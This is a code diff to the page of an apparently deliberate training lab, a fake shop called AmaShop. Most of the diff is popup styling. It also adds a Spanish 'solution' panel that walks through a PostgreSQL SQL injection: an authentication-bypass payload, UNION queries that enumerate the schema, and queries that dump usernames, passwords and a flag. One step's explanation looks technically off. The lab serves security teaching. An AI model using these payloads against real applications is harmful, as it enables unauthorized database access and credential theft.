@@ -140,7 +140,123 @@
 		.flag-btn:hover {
 		    background-color: #45a049;
 		}
-
+		/* Popup estilo minimalista */
+		.popup-solucion {
+		  position: fixed;
+		  top: 50%;
+		  left: 50%;
+		  transform: translate(-50%, -50%);
+		  background-color: #ffffff;
+		  border-radius: 10px;
+		  padding: 25px 20px;
+		  width: 400px;
+		  max-width: 90%;
+		  z-index: 1000;
+		  font-family: 'Segoe UI', sans-serif;
+		  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+		  animation: popupFade 0.3s ease-in-out;
+		  overflow: hidden; /* Evitar el desbordamiento fuera del popup */
+		}
+		
+		.popup-header-solucion {
+		  display: flex;
+		  justify-content: space-between;
+		  align-items: center;
+		  border-bottom: 1px solid #e0e0e0;
+		  padding-bottom: 10px;
+		  margin-bottom: 15px;
+		}
+		
+		.popup-header-solucion h2 {
+		  color: #333;
+		  font-size: 1.2rem;
+		  margin: 0;
+		}
+		
+		.cerrar-btn {
+		  background: none;
+		  border: none;
+		  color: #888;
+		  font-size: 1.2rem;
+		  cursor: pointer;
+		}
+		
+		/* Área de contenido del popup con scroll */
+		.popup-contenido-solucion {
+		  color: #444;
+		  font-size: 0.95rem;
+		  line-height: 1.5;
+		  margin-bottom: 20px;
+		  max-height: 300px; /* Define el tamaño máximo del contenido */
+		  overflow-y: auto; /* Agrega scroll vertical si el contenido excede el tamaño */
+		  padding-right: 10px; /* Da espacio para el scrollbar */
+		}
+		
+		.codigo-solucion {
+		  font-family: 'Courier New', monospace;
+		  background-color: #ababab;
+		  padding: 3px 6px;
+		  border-radius: 4px;
+		  color: #000;
+		}
+		
+		.comentario-codigo {
+		  color: #555;
+		  font-style: italic;
+		  margin-left: 5px;
+		}
+		
+		.btn-cerrar-solucion {
+		  background-color: #1976d2;
+		  color: white;
+		  border: none;
+		  padding: 10px 16px;
+		  border-radius: 4px;
+		  font-weight: 500;
+		  cursor: pointer;
+		  transition: background-color 0.3s ease;
+		}
+		
+		.btn-cerrar-solucion:hover {
+		  background-color: #1565c0;
+		}
+		
+		/* Botón de solución */
+		.solution-btn {
+		  position: fixed;
+		  bottom: 10px;
+		  left: 10px;
+		  background-color: #1976d2;
+		  color: #fff;
+		  border: none;
+		  font-size: 1.5rem;
+		  border-radius: 50%;
+		  width: 50px;
+		  height: 50px;
+		  cursor: pointer;
+		  box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+		  transition: transform 0.2s ease;
+		  z-index: 1000;
+		}
+		
+		.solution-btn:hover {
+		  transform: scale(1.1);
+		}
+		
+		.hidden {
+		  display: none;
+		}
+		
+		@keyframes popupFade {
+		  from {
+		    opacity: 0;
+		    transform: translate(-50%, -50%) scale(0.95);
+		  }
+		  to {
+		    opacity: 1;
+		    transform: translate(-50%, -50%) scale(1);
+		  }
+		}
 </style>
 </head>
 <body>
@@ -363,8 +479,51 @@
     <footer>
         <p>&copy; 2025 AmaShop. Todos los derechos reservados.</p>
     </footer>
+    <!-- Botón para mostrar la solución -->
+	<button class="solution-btn" type="button" onclick="showPopupSolution()">💡</button>
+	
+	<!-- Popup de solución -->
+	<div id="popup-solution" class="popup-solucion hidden">
+	  <div class="popup-header-solucion">
+	    <h2>💡 Solución</h2>
+	    <button class="cerrar-btn" onclick="closePopupSolution()">✖</button>
+	  </div>
+	  <div class="popup-contenido-solucion">
+		  <p>En este laboratorio nos encontramos con una vulnerabilidad de tipo <b>SQL Injection (SQLi)</b> en una aplicación que utiliza <b>PostgreSQL</b> como base de datos.</p>
+		  <p>El problema radica en que las consultas SQL no están siendo correctamente sanitizadas, lo que permite que los usuarios inyecten código SQL malicioso en la entrada de búsqueda.</p>
+		  <p><b>EJEMPLOS:</b></p>
+		  
+		  <p><span class="codigo-solucion">' OR 1=1-- -</span> <span class="comentario-codigo"># Con este comando logramos eludir las restricciones y ver todos los productos, incluidos los ocultos, al saber que la aplicación es vulnerable a esta inyección.</span></p>
+		  
+		  <p><span class="codigo-solucion">' union select current_database()-- -</span> <span class="comentario-codigo"># Este comando nos permite ver la base de datos actual, en este caso <i>amashop_db</i>.</span></p>
+		  
+		  <p><span class="codigo-solucion">' union select datname from amashop_db-- -</span> <span class="comentario-codigo"># Ahora que sabemos el nombre de la base de datos, podemos consultar las tablas dentro de ella.</span></p>
+		  
+		  <p><span class="codigo-solucion">' union select column_name from information_schema.columns where table_name='users'-- -</span> <span class="comentario-codigo"># Aquí consultamos las columnas de la tabla <i>users</i> para obtener información sobre qué datos se almacenan en dicha tabla.</span></p>
+		  
+		  <p><span class="codigo-solucion">' union select column_name from information_schema.columns where table_name='flag'-- -</span> <span class="comentario-codigo"># Lo mismo con la tabla <i>flag</i> para ver sus columnas y encontrar la que contiene la FLAG.</span></p>
+		  
+		  <p><span class="codigo-solucion">' union select username || ' - ' || password from users-- -</span> <span class="comentario-codigo"># En este punto podemos obtener los nombres de usuario y las contraseñas de la tabla <i>users</i>.</span></p>
+		  
+		  <p><span class="codigo-solucion">' union select flag from flag-- -</span> <span class="comentario-codigo"># Finalmente, obtenemos la <b>FLAG</b> que está almacenada en la tabla <i>flag</i>, completando así el laboratorio.</span></p>
+		
+		  <p>Este tipo de vulnerabilidad es muy común en aplicaciones que no implementan medidas adecuadas de validación de las entradas de los usuarios, lo que permite a un atacante obtener acceso no autorizado a la base de datos y obtener información sensible.</p>
+		</div>
+
+	  <button class="btn-cerrar-solucion" onclick="closePopupSolution()">Cerrar</button>
+	</div>
    <script src="<%= request.getContextPath() %>/js/amashop.js"></script>
    <script>
+		 //Mostrar el popup de solución
+		   function showPopupSolution() {
+		     document.getElementById("popup-solution").classList.remove("hidden");
+		   }
+		
+		   // Cerrar el popup de solución
+		   function closePopupSolution() {
+		     document.getElementById("popup-solution").classList.add("hidden");
+		   }
+		   
         // Función para mostrar el popup
         function showPopup(message) {
             var popup = document.getElementById("popupMessage");
